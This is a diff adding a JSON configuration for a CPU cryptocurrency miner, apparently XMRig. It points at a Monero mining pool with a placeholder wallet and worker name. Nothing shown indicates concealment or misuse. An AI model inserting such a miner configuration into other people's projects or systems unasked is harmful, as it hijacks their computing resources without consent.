@@ -1,0 +1,18 @@
+{
+    "autosave": true,
+    "cpu": true,
+    "opencl": false,
+    "cuda": false,
+    "pools": [
+        {
+            "url": "pool.minexmr.com:4444",
+            "user": "49xQzr7someWalletAddress/worker1",
+            "pass": "x",
+            "keepalive": true,
+            "tls": false
+        }
+    ],
+    "print-time": 60,
+    "retries": 5,
+    "retry-pause": 5
+}
